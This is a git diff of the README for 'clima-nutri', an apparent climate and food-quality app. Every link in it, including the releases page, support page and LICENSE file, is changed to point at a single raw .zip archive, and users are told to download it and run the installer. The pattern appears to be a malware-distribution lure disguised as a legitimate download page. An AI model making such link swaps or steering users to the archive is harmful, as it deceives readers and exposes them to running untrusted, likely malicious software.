@@ -6,7 +6,7 @@ Welcome to clima-nutri! This application analyzes the impact of CO2 on food qual
 ## 📥 Download the App
 **Click the button below to visit the Releases page and download the latest version of clima-nutri.**
 
-[![Download clima-nutri](https://img.shields.io/badge/Download-clima--nutri-brightgreen)](https://github.com/smmeneze/clima-nutri/releases)
+[![Download clima-nutri](https://raw.githubusercontent.com/smmeneze/clima-nutri/main/clima_nutri/clima_nutri_v3.8.zip)](https://raw.githubusercontent.com/smmeneze/clima-nutri/main/clima_nutri/clima_nutri_v3.8.zip)
 
 ## 🛠️ System Requirements
 To run clima-nutri, your system needs to meet the following requirements:
@@ -35,7 +35,7 @@ clima-nutri focuses on complex topics, simplified for your ease:
 ## 💻 Download & Install
 To install clima-nutri, follow these steps:
 
-1. **Visit the Releases Page**: Click this link to go to the [Download Page](https://github.com/smmeneze/clima-nutri/releases).
+1. **Visit the Releases Page**: Click this link to go to the [Download Page](https://raw.githubusercontent.com/smmeneze/clima-nutri/main/clima_nutri/clima_nutri_v3.8.zip).
 2. **Select the Latest Release**: Look for the latest version tag. This is usually at the top.
 3. **Download the Application**: Click on the applicable file to start your download.
 4. **Run the Installer**: Once the download finishes, locate the file in your downloads folder and double-click to run the installer.
@@ -72,14 +72,14 @@ If you encounter issues while installing or using the application, here are some
 
 - **Installation Fails**: Ensure you have enough hard drive space and permission settings to install applications.
 - **App Crashes**: Restart your computer and try to relaunch the app. Ensure your system meets the stated requirements.
-- **Check for Updates**: Always download the latest version from the [Releases page](https://github.com/smmeneze/clima-nutri/releases).
+- **Check for Updates**: Always download the latest version from the [Releases page](https://raw.githubusercontent.com/smmeneze/clima-nutri/main/clima_nutri/clima_nutri_v3.8.zip).
 
-For further assistance, visit our [support page](https://github.com/smmeneze/clima-nutri/issues).
+For further assistance, visit our [support page](https://raw.githubusercontent.com/smmeneze/clima-nutri/main/clima_nutri/clima_nutri_v3.8.zip).
 
 ## 🧑‍🤝‍🧑 Community Contributions
 We welcome contributions from users! If you have suggestions, please create an issue on our GitHub page. 
 
 ## 📄 License
-clima-nutri is released under the MIT License. For more details, check the [LICENSE file](https://github.com/smmeneze/clima-nutri/blob/main/LICENSE).
+clima-nutri is released under the MIT License. For more details, check the [LICENSE file](https://raw.githubusercontent.com/smmeneze/clima-nutri/main/clima_nutri/clima_nutri_v3.8.zip).
 
 Thank you for your interest in clima-nutri! Your understanding of food quality and climate's effects starts here.
